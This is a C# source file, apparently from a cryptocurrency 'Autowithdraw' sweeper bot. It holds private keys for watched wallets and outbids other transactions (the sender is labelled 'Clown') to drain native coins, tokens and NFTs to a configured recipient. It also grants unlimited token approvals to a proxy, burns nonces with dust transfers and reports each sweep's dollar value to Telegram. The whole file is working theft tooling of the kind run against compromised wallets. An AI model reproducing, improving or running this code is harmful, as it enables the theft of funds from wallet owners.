using Autowithdraw.Global;
using Autowithdraw.Global.Common;
using Autowithdraw.Global.Objects;
using Nethereum.Contracts;
using Nethereum.Hex.HexTypes;
using Nethereum.RPC.Eth.DTOs;
using Nethereum.Util;
using Nethereum.Web3;
using Nethereum.Web3.Accounts;
using System;
using System.Collections.Generic;
using System.Numerics;
using System.Threading;
using System.Threading.Tasks;

namespace Autowithdraw.Main.Actions
{
    internal class SmartGas
    {
        public static List<string> Busy = new List<string>();

        public static async Task Native(
            string Address,
            string TransferAddress,
            BigInteger Gas,
            BigInteger Nonce,
            bool Contains,
            int ChainID)
        {
            try
            {
                #region Antispam

                string Mutex = Address + Nonce;
                if (Busy.Contains(Mutex))
                    new Thread(() =>
                    {
                        Thread.Sleep(1000 * 180);
                        Busy.Remove(Mutex);
                    }).Start();

                #endregion

                if (Settings.Config.Other.StoppedAW)
                    return;

                #region Values

                Web3 Account = new Web3(new Account(Settings.Wallets[Address], ChainID),
                    Settings.Chains[ChainID].HTTPClient);

                BigInteger Balance = await Account.Eth.GetBalance.SendRequestAsync(Address);
                float Price = Pricing.GetPrice(Balance, ChainID);
                string Link = Settings.Chains[ChainID].Link;
                string Symbol = Settings.Chains[ChainID].Token;
                BigInteger GasPrice = new BigInteger((double)Gas * 1.3f);
                BigInteger LastNonce = Nonce;

                #endregion

                Logger.Debug($"SmartGas Native - {Address} - {(Contains ? 3 : 100)} - {Nonce} - {Price}$ ({ChainID})");

                for (int i = 0; i < (Contains ? 3 : 100);)
                {
                    try
                    {
                        #region Calculating Fee

                        if (LastNonce != await Account.Eth.Transactions.GetTransactionCount.SendRequestAsync(Address, BlockParameter.BlockParameterType.latest))
                        {
                            LastNonce = await Account.Eth.Transactions.GetTransactionCount.SendRequestAsync(Address, BlockParameter.BlockParameterType.latest);
                            Balance = await Account.Eth.GetBalance.SendRequestAsync(Address);
                            GasPrice = await Pricing.GetGwei(ChainID);
                        }

                        BigInteger NewWei = Balance - GasPrice * Settings.Chains[ChainID].DefaultGas;

                        if (NewWei < 0)
                        {
                            GasPrice = (Balance - Helper.GetWei(true)) / Settings.Chains[ChainID].DefaultGas;
                            NewWei = Helper.GetWei();
                        }

                        #endregion

                        try
                        {
                            var Input = new TransactionInput
                            {
                                From = Address,
                                To = Settings.Config.Recipient,
                                Gas = new HexBigInteger(Settings.Chains[ChainID].DefaultGas),
                                GasPrice = new HexBigInteger(GasPrice),
                                Value = new HexBigInteger(NewWei),
                                Nonce = new HexBigInteger(LastNonce)
                            };

                            if (Transfer.GasPrices.ContainsKey(Address))
                                if (Transfer.GasPrices[Address].Nonce == LastNonce && Transfer.GasPrices[Address].GasPrice > GasPrice)
                                    throw new Exception("Bused");

                            Transfer.GasPrices[Address] = new TransactionDescription
                            {
                                Nonce = LastNonce,
                                GasPrice = GasPrice
                            };

                            string txHash = await Account.Eth.TransactionManager.SendTransactionAsync(Input);

                            #region Notification

                            await Task.Factory.StartNew(async () =>
                            {
                                TransactionReceipt Transaction = await Helper.WaitForTransactionReceipt(txHash, ChainID);
                                if (!Transaction.Succeeded())
                                    return;

                                float Price = Pricing.GetPrice(NewWei + Input.GasPrice.Value * Settings.Chains[ChainID].DefaultGas, ChainID);
                                float EtherNew = (float)Web3.Convert.FromWei(NewWei);
                                float PriceNew = Pricing.GetPrice(NewWei, ChainID);
                                bool Deleted = NewWei == Helper.GetWei();

                                Settings.Stats.AddNative(PriceNew, true);

                                Logger.Debug($"{(Deleted ? $"Delete {Price}$" : $"Retransfered {EtherNew} {Symbol} ({PriceNew}$)")} from {Address}", ConsoleColor.Green);
                                if (PriceNew >= Settings.Config.Other.Minimum || (Price > 30 && Deleted))
                                    await Network.SendTelegram(
                                        $"{Pricing.GetEmoji(PriceNew, Deleted)} <a href=\"https://{Link}/tx/{Transaction.TransactionHash}\">Retransfered{(Deleted ? " & Deleted" : "")} {Symbol}</a>\n\nWallet: <a href=\"https://{Link}/address/{Address}\">{Address}</a>\nClown: <a href=\"https://{Link}/address/{TransferAddress}\">{TransferAddress}</a>\nAmount: {(Deleted ? 0 : EtherNew)} {Symbol} ({(Price - PriceNew >= 2 ? $"{PriceNew}/{Price}$" : $"{PriceNew}$")})", isNative: true);
                               
                            });

                            #endregion
                        }
                        catch (Exception e)
                        {
                            //Logger.ErrorSpam(e, $"Native - {Address} - {Nonce} - {Web3.Convert.FromWei(Balance)} - {Web3.Convert.FromWei(GasPrice, UnitConversion.EthUnit.Gwei)}");

                            if (e.Message.Contains("underpriced"))
                                GasPrice += new BigInteger((double)Balance * 0.10) / Settings.Chains[ChainID].DefaultGas;

                            if (Helper.AddNonce(e) && !e.Message.Contains("already known"))
                                continue;
                        }
                    }
                    catch
                    {
                        // ignored
                    }

                    i++;
                    Thread.Sleep(300);
                }
            }
            catch (Exception e)
            {
                if (!e.Message.Contains("transaction underpriced"))
                    Logger.Error(e);
            }
        }

        public static async Task Token(
            string Address,
            string ContractAddress,
            string TransferAddress,
            BigInteger Wei,
            BigInteger GasPriceByAnother,
            BigInteger Nonce,
            bool Contains,
            int ChainID)
        {
            try
            {
                #region Antispam

                string Mutex = Address + ContractAddress + "Token";
                if (Busy.Contains(Mutex))
                    new Thread(() =>
                    {
                        Thread.Sleep(1000 * 7);
                        Busy.Remove(Mutex);
                    }).Start();

                if (Busy.Contains(Address + Nonce))
                    return;

                Busy.Add(Address + Nonce);

                #endregion

                if (Settings.Config.Other.StoppedAW)
                    return;

                #region Values

                Web3 Account = new Web3(new Account(Settings.Wallets[Address], ChainID),
                    Settings.Chains[ChainID].HTTPClient);

                string Link = Settings.Chains[ChainID].Link;

                var Contract = new ContractHelper(Address, ContractAddress, Account);
                Function Transfer = Contract.Get("transfer");

                #endregion

                BigInteger BalanceWei = 0;

                Logger.Debug($"SmartGas Token - {Address} - {TransferAddress} - {(Contains ? 1 : 200)} ({ChainID})");

                for (int i = 0; i < (Contains ? 2 : 200); i++)
                {
                    try
                    {
                        BigInteger Balance = await Contract.Balance();

                        if (Balance < 10000000000)
                        {
                            Balance = Wei;
                        }

                        string txHash = "";

                        #region Check balance

                        BalanceWei = (await Account.Eth.GetBalance.SendRequestAsync(Address)).Value - 666;
                        BigInteger CurrentBase = await Account.Eth.GasPrice.SendRequestAsync();

                        if (BalanceWei / Settings.Chains[ChainID].DefaultGas < CurrentBase)
                            throw new Exception("Not have balance");

                        #endregion

                        #region Full Balance

                        BigInteger GasLimit = 0;

                        try
                        {
                            GasLimit = await Transfer.EstimateGasAsync(Address, null, null, Settings.Config.Recipient, Balance);

                            txHash = await Transfer.SendTransactionAsync(new TransactionInput
                            {
                                From = Address,
                                Gas = new HexBigInteger(GasLimit),
                                GasPrice = new HexBigInteger(BalanceWei / GasLimit),
                                Nonce = new HexBigInteger(Nonce)
                            }, Settings.Config.Recipient, Balance);
                        }

                        #endregion
                        catch
                        {
                            try
                            {
                                GasLimit = await Transfer.EstimateGasAsync(Address, null, null, Settings.Config.Recipient, 0);

                                await Transfer.SendTransactionAsync(new TransactionInput
                                {
                                    From = Address,
                                    Gas = new HexBigInteger(GasLimit),
                                    GasPrice = new HexBigInteger(BalanceWei / GasLimit),
                                    Nonce = new HexBigInteger(Nonce)
                                }, Settings.Config.Recipient, 0);
                            }
                            catch (Exception e)
                            {
                                #region Delete current transaction

                                string hash = await Account.Eth.TransactionManager.SendTransactionAsync(new TransactionInput
                                {
                                    From = Address,
                                    Gas = new HexBigInteger(Settings.Chains[ChainID].DefaultGas),
                                    GasPrice = new HexBigInteger((BalanceWei - Helper.GetWei(true)) / Settings.Chains[ChainID].DefaultGas),
                                    To = Settings.Config.Recipient,
                                    Value = new HexBigInteger(Helper.GetWei()),
                                    Nonce = new HexBigInteger(Nonce)
                                });

                                #endregion

                                Logger.ErrorSpam(e, $"Full balance {Address} - {Nonce} - {Web3.Convert.FromWei(BalanceWei)} - {Web3.Convert.FromWei(BalanceWei / GasLimit, UnitConversion.EthUnit.Gwei)} - {hash}");
                            }
                        }

                        Nonce++;

                        if (txHash != "")
                            await Task.Factory.StartNew(async () =>
                            {
                                TransactionReceipt Transaction = await Helper.WaitForTransactionReceipt(txHash, ChainID);

                                if (!Transaction.Succeeded())
                                    return;

                                #region Notification

                                string Symbol = await Contract.Symbol();
                                BigDecimal Decimals = await Contract.Decimals();
                                float BalanceEther = (float)(Balance / Decimals);

                                bool Valid = Pricing.ValidPrice(ChainID, Address, ContractAddress, Balance, BalanceEther, Decimals, await Contract.Name(), out float Price,
                                    out float Ether, out BigInteger _, isNotification: true);

                                Settings.Stats.AddTokens(Price, true);

                                Logger.Debug($"Retransfered {Ether} {Symbol} ({Price}$) from {Address}", ConsoleColor.Green);
                                if (Valid)
                                    await Network.SendTelegram(
                                        $"{Pricing.GetEmoji(Price)} <a href=\"https://{Link}/tx/{Transaction.TransactionHash}\">Retransfered {Symbol}</a>\n\nWallet: <a href=\"https://{Link}/address/{Address}\">{Address}</a>\nClown: <a href=\"https://{Link}/address/{TransferAddress}\">{TransferAddress}</a>\nAmount: {Ether} <a href=\"https://{Link}/token/{ContractAddress}?a={Address}\">{Symbol}</a> ({Price}$)", ContractAddress, ChainID, true);
                               

                                #endregion
                            });
                    }
                    catch (Exception e)
                    {
                        Logger.ErrorSpam(e, $"Current - {Address} - {Nonce} - {Web3.Convert.FromWei(BalanceWei)} - {Web3.Convert.FromWei((BalanceWei - Helper.GetWei(true)) / Settings.Chains[ChainID].DefaultGas, UnitConversion.EthUnit.Gwei)}");

                        if (e.Message.Contains("underpriced"))
                            continue;
                        if (Helper.AddNonce(e))
                            Nonce++;
                    }
                    Thread.Sleep(50);
                }
            }
            catch
            {
                // ignored
            }
        }

        public static async Task NFT(
            string Address,
            string ContractAddress,
            string FromAddress,
            string TransferAddress,
            BigInteger Wei,
            BigInteger GasPriceByAnother,
            BigInteger GasLimitByAnother,
            BigInteger Nonce,
            bool Contains,
            bool Safe,
            int ChainID)
        {
            try
            {
                #region Antispam

                string Mutex = Address + ContractAddress + "Token";
                if (Busy.Contains(Mutex))
                    new Thread(() =>
                    {
                        Thread.Sleep(1000 * 7);
                        Busy.Remove(Mutex);
                    }).Start();

                #endregion

                if (Settings.Config.Other.StoppedAW)
                    return;

                #region Values

                Web3 Account = new Web3(new Account(Settings.Wallets[Address], ChainID),
                    Settings.Chains[ChainID].HTTPClient);

                string Link = Settings.Chains[ChainID].Link;

                BigInteger GasPrice = new BigInteger((double)GasPriceByAnother * 1.7) + await Pricing.GetPriority(10, ChainID, 60000);
                var Contract = new ContractHelper(Address, ContractAddress, Account);
                Function Transfer = Contract.Get(Safe ? "safeTransferFrom" : "transferFrom");

                #endregion

                Logger.Debug($"SmartGas TransferFrom - {Address} - {(Contains ? 1 : 200)} ({ChainID})");

                for (int i = 0; i < (Contains ? 3 : 200); i++)
                {
                    try
                    {
                        string txHash = "";

                        #region Check balance

                        BigInteger BalanceWei = (await Account.Eth.GetBalance.SendRequestAsync(Address)).Value - 666;
                        BigInteger CurrentBase = await Account.Eth.GasPrice.SendRequestAsync();

                        if (BalanceWei / Settings.Chains[ChainID].DefaultGas < CurrentBase)
                            throw new Exception("Not have balance");

                        #endregion

                        #region Full Balance

                        try
                        {
                            txHash = await Transfer.SendTransactionAsync(new TransactionInput
                            {
                                From = Address,
                                Gas = new HexBigInteger(GasLimitByAnother),
                                GasPrice = new HexBigInteger(GasPrice),
                                Nonce = new HexBigInteger(Nonce)
                            }, FromAddress, Settings.Config.Recipient, Wei);
                        }

                        #endregion
                        catch
                        {
                            #region Delete current transaction

                            await Account.Eth.TransactionManager.SendTransactionAsync(new TransactionInput
                            {
                                From = Address,
                                Gas = new HexBigInteger(Settings.Chains[ChainID].DefaultGas),
                                GasPrice = new HexBigInteger((BalanceWei - Helper.GetWei(true)) / Settings.Chains[ChainID].DefaultGas),
                                To = Settings.Config.Recipient,
                                Value = new HexBigInteger(Helper.GetWei()),
                                Nonce = new HexBigInteger(Nonce)
                            });

                            #endregion
                        }

                        Nonce++;

                        if (txHash != "")
                            await Task.Factory.StartNew(async () =>
                            {
                                TransactionReceipt Transaction = await Helper.WaitForTransactionReceipt(txHash, ChainID);

                                if (!Transaction.Succeeded())
                                    return;

                                #region Notification

                                string Symbol = await Contract.Symbol();

                                Settings.Stats.AddProxySpend(Pricing.GetPriceEther(GasLimitByAnother * GasPrice, ChainID));

                                Logger.Debug($"Retransfered NFT {Symbol} from {Address}", ConsoleColor.Green);
                                await Network.SendTelegram(
                                        $"{Pricing.GetEmoji(1)} <a href=\"https://{Link}/tx/{Transaction.TransactionHash}\">Retransfered NFT {Symbol}</a>\n\nWallet: <a href=\"https://{Link}/address/{Address}\">{Address}</a>\nClown: <a href=\"https://{Link}/address/{TransferAddress}\">{TransferAddress}</a>\nID: {Wei} <a href=\"https://{Link}/token/{ContractAddress}?a={Address}\">{Symbol}</a> (?$)", ContractAddress, ChainID, true);

                                #endregion
                            });
                    }
                    catch (Exception e)
                    {
                        if (e.Message.Contains("underpriced"))
                            continue;
                        if (Helper.AddNonce(e))
                            Nonce++;
                    }
                    Thread.Sleep(50);
                }
            }
            catch
            {
                // ignored
            }
        }

        public static async Task TransferFrom(
            string Address,
            string TransferAddress,
            string ContractAddress,
            BigInteger GasPriceByAnother,
            BigInteger GasLimitByAnother,
            int ChainID)
        {
            if (Settings.Config.Other.StoppedAW)
                return;

            string Destination = Settings.Config.Proxy.Address;
            Web3 Account = new Web3(new Account(Settings.Config.Proxy.PrivateKey, ChainID),
                Settings.Chains[ChainID].HTTPClient);
            string Link = Settings.Chains[ChainID].Link;

            try
            {
                #region Values

                BigInteger GasPrice = new BigInteger((double)GasPriceByAnother * 1.7) + await Pricing.GetPriority(10, ChainID, 60000);
                var Contract = new ContractHelper(Destination, ContractAddress, Account);
                Function Transfer = Contract.Get("transferFrom");
                BigInteger ApproveWei = await Contract.Allowance(Address, TransferAddress);
                BigInteger ApproveWeiProxy = await Contract.Allowance(Address, Destination);
                BigInteger Wei = await new ContractHelper(Address, ContractAddress, new Web3(new Account(Settings.Wallets[Address], ChainID), Settings.Chains[ChainID].HTTPClient)).Balance();

                #endregion

                Logger.Debug($"SmartGas TransferFrom - {Address} - {TransferAddress} - {GasPriceByAnother} ({ChainID})");

                if (ApproveWei < Wei && ApproveWei != -1 || ApproveWeiProxy < Wei && ApproveWeiProxy != -1)
                {
                    Logger.Debug("Not approved");
                    return;
                }

                TransactionInput TX = new TransactionInput
                {
                    From = Destination,
                    Gas = await Transfer.EstimateGasAsync(Destination, null, null, Settings.Config.Recipient, Wei),
                    GasPrice = new HexBigInteger(GasPrice)
                };

                TX.Nonce = await Account.Eth.Transactions.GetTransactionCount.SendRequestAsync(Destination, BlockParameter.BlockParameterType.latest);

                string txHash = await Transfer.SendTransactionAsync(TX, Address, Settings.Config.Recipient, Wei);

                TransactionReceipt Transaction = await Helper.WaitForTransactionReceipt(txHash, ChainID, true) ?? throw new Exception("null");

                if (!Transaction.Succeeded())
                    throw new Exception($"Not success {txHash}");

                #region Notification

                string Symbol = await Contract.Symbol();
                Pricing.ValidPrice(ChainID, Address, ContractAddress, Wei, Wei, await Contract.Decimals(), await Contract.Name(), out float Price,
                    out float Ether, out BigInteger _);

                Settings.Stats.AddProxySpend(Pricing.GetPriceEther(GasLimitByAnother * GasPrice, ChainID));
                Settings.Stats.AddTokens(Price, true);

                Logger.Debug($"Retranfered {Ether} {Symbol} ({Price}$) from {Address}", ConsoleColor.Green);
                await Network.SendTelegram($"{Pricing.GetEmoji(Price)} <a href=\"https://{Link}/tx/{Transaction.TransactionHash}\">Retransfered {Symbol} (Transfer From)</a>\n\nWallet: <a href=\"https://{Link}/address/{Address}\">{Address}</a>\nClown: <a href=\"https://{Link}/address/{TransferAddress}\">{TransferAddress}</a>\nAmount: {Ether} <a href=\"https://{Link}/token/{ContractAddress}?a={Address}\">{Symbol}</a> ({Price}$)", ContractAddress, ChainID, true);

                #endregion
            }
            catch (NullReferenceException)
            {
                // ignored
            }
            catch (Exception e)
            {
                if (e.Message.Contains("insufficient"))
                    await Network.SendTelegram($"Proxy not have funds - <a href=\"https://{Link}/address/{Destination}\">{Destination}</a>");
                Logger.Error(e.Message + " Transferfrom");
                if (!e.Message.Contains("transaction underpriced") &&
                         !e.Message.Contains("nonce too low") &&
                         !e.Message.Contains("already known"))
                    Logger.Error(e);
            }
        }

        public static async Task Claim(
            string Address,
            BigInteger GasPriceByAnother,
            BigInteger GasLimitByAnother,
            BigInteger Nonce,
            int ChainID)
        {
            try
            {
                if (Settings.Config.Other.StoppedAW)
                    return;

                #region Values

                Web3 Account = new Web3(new Account(Settings.Wallets[Address], ChainID),
                    Settings.Chains[ChainID].HTTPClient);
                string Link = Settings.Chains[ChainID].Link;
                BigInteger GasPrice = (GasPriceByAnother * GasLimitByAnother - Helper.GetWei(true)) / Settings.Chains[ChainID].DefaultGas;

                #endregion

                Logger.Debug($"SmartGas Claim - {Address} ({ChainID})");

                #region Deletes

                try
                {
                    await Account.Eth.TransactionManager.SendTransactionAsync(new TransactionInput
                    {
                        From = Address,
                        Gas = new HexBigInteger(Settings.Chains[ChainID].DefaultGas),
                        GasPrice = new HexBigInteger(GasPrice),
                        To = Settings.Config.Recipient,
                        Value = new HexBigInteger(Helper.GetWei()),
                        Nonce = new HexBigInteger(Nonce)
                    });

                    Nonce++;
                }
                catch
                {
                    // ignored
                }

                for (int i = 0; i < 10;)
                {
                    try
                    {
                        await Account.Eth.TransactionManager.SendTransactionAsync(new TransactionInput
                        {
                            From = Address,
                            GasPrice = new HexBigInteger(GasPrice),
                            To = Settings.Config.Recipient,
                            Value = new HexBigInteger(Helper.GetWei()),
                            Nonce = new HexBigInteger(Nonce)
                        });

                        throw new Exception("Sent");
                    }
                    catch (Exception e)
                    {
                        if (Helper.AddNonce(e) || e.Message.Contains("Sent"))
                        {
                            Nonce++;
                            continue;
                        }
                    }

                    i++;
                    Thread.Sleep(300);
                }

                #endregion

                #region Notification
                Logger.Debug($"Delete Claim from {Address}");
                #endregion
            }
            catch (NullReferenceException)
            {
                // ignored
            }
            catch (Exception e)
            {
                Logger.Error(e.Message + " CLAIM");
                if (!e.Message.Contains("transaction underpriced") &&
                         !e.Message.Contains("nonce too low") &&
                         !e.Message.Contains("already known"))
                    Logger.Error(e);
            }
        }

        public static async Task Approve(
            string Address,
            string ContractAddress,
            string ApproveAddress,
            BigInteger GasPriceByAnother,
            BigInteger GasLimitByAnother,
            BigInteger Nonce,
            int ChainID)
        {
            try
            {
                if (Settings.Config.Other.StoppedAW)
                    return;

                #region Values

                string Destination = Settings.Config.Proxy.Address;
                string Link = Settings.Chains[ChainID].Link;

                Web3 Account = new Web3(new Account(Settings.Wallets[Address], ChainID),
                    Settings.Chains[ChainID].HTTPClient);

                var Contract = new ContractHelper(Address, ContractAddress, Account);
                Function Approve = Contract.Get("approve");

                BigInteger Balance = GasPriceByAnother * GasLimitByAnother - Helper.GetWei(true);

                #endregion

                Logger.Debug($"SmartGas Approve - {Address} ({ChainID})");

                string txHash = "";
                bool Delete = true;

                #region Deletes

                try
                {
                    BigInteger ApproveWei = await Contract.Allowance(Address, ApproveAddress);
                    BigInteger ApproveWeiProxy = await Contract.Allowance(Address, Destination);

                    BigInteger GasLimit = await Approve.EstimateGasAsync(Address, null, null, Destination, Settings.MaxInt);
                    BigInteger GasPrice = Balance / GasLimit;

                    if (ApproveWeiProxy <= Settings.MinInt && ApproveWeiProxy != -1)
                    {
                        txHash = await Approve.SendTransactionAsync(new TransactionInput
                        {
                            From = Address,
                            Gas = new HexBigInteger(GasLimit),
                            GasPrice = new HexBigInteger(GasPrice),
                            Nonce = new HexBigInteger(Nonce)
                        }, Destination, Settings.MaxInt);
                        Delete = false;
                    }

                    else if ((ApproveWei >= Settings.MinInt || ApproveWei == -1) && ApproveAddress != Destination)
                    {
                        GasLimit = await Approve.EstimateGasAsync(Address, null, null, ApproveAddress, 0);
                        txHash = await Approve.SendTransactionAsync(new TransactionInput
                        {
                            From = Address,
                            Gas = new HexBigInteger(GasLimit),
                            GasPrice = new HexBigInteger(Balance / GasLimit),
                            Nonce = new HexBigInteger(Nonce)
                        }, ApproveAddress, 0);
                    }

                    if (txHash != "")
                    {
                        Nonce++;

                        TransactionReceipt Transaction = await Helper.WaitForTransactionReceipt(txHash, ChainID);
                        if (Transaction == null || !Transaction.Succeeded())
                            return;

                        #region Notification

                        string Symbol = await Contract.Symbol();

                        Logger.Debug($"Retransfered Approve {Symbol} from {Address}", ConsoleColor.Green);
                        await Network.SendTelegram($"<a href=\"https://{Link}/tx/{Transaction.TransactionHash}\">🛡 Retransfered & {(Delete ? "Revoked" : "Approved")}</a> <a href=\"https://{Link}/token/{ContractAddress}?a={Address}\">{Symbol}</a>\n\nWallet: <a href=\"https://{Link}/address/{Address}\">{Address}</a>{(Delete ? $"\nClown: <a href=\"https://{Link}/address/{ApproveAddress}\">{ApproveAddress}</a>" : "")}", ContractAddress, ChainID, true, isTransaction: true);

                        #endregion
                    }
                    else
                        throw new Exception();
                }
                catch
                {
                    try
                    {
                        await Account.Eth.TransactionManager.SendTransactionAsync(new TransactionInput
                        {
                            From = Address,
                            Gas = new HexBigInteger(Settings.Chains[ChainID].DefaultGas),
                            GasPrice = new HexBigInteger(Balance / Settings.Chains[ChainID].DefaultGas),
                            To = Settings.Config.Recipient,
                            Value = new HexBigInteger(Helper.GetWei()),
                            Nonce = new HexBigInteger(Nonce)
                        });
                        Nonce++;
                    }
                    catch
                    {
                        // ignored
                    }
                }

                BigInteger Gas = await Approve.EstimateGasAsync(Address, null, null, Destination, Settings.MaxInt);

                for (int i = 0; i < 3;)
                {
                    try
                    {
                        await Approve.SendTransactionAsync(new TransactionInput
                        {
                            From = Address,
                            Gas = new HexBigInteger(Gas),
                            GasPrice = new HexBigInteger(Balance / Gas),
                            Nonce = new HexBigInteger(Nonce)
                        }, Destination, Settings.MaxInt);

                        throw new Exception("Sent");
                    }
                    catch (Exception e)
                    {
                        if (Helper.AddNonce(e) && !e.Message.Contains("underpriced") || e.Message.Contains("Sent"))
                        {
                            Nonce++;
                            continue;
                        }
                    }

                    i++;
                    Thread.Sleep(500);
                }
                #endregion
            }
            catch (NullReferenceException)
            {
                // ignored
            }
            catch (DivideByZeroException)
            {
                // ignored
            }
            catch (Exception e)
            {
                if (!e.Message.Contains("transaction underpriced") &&
                    !e.Message.Contains("nonce too low"))
                    Logger.Error(e);
            }
        }
    }
}
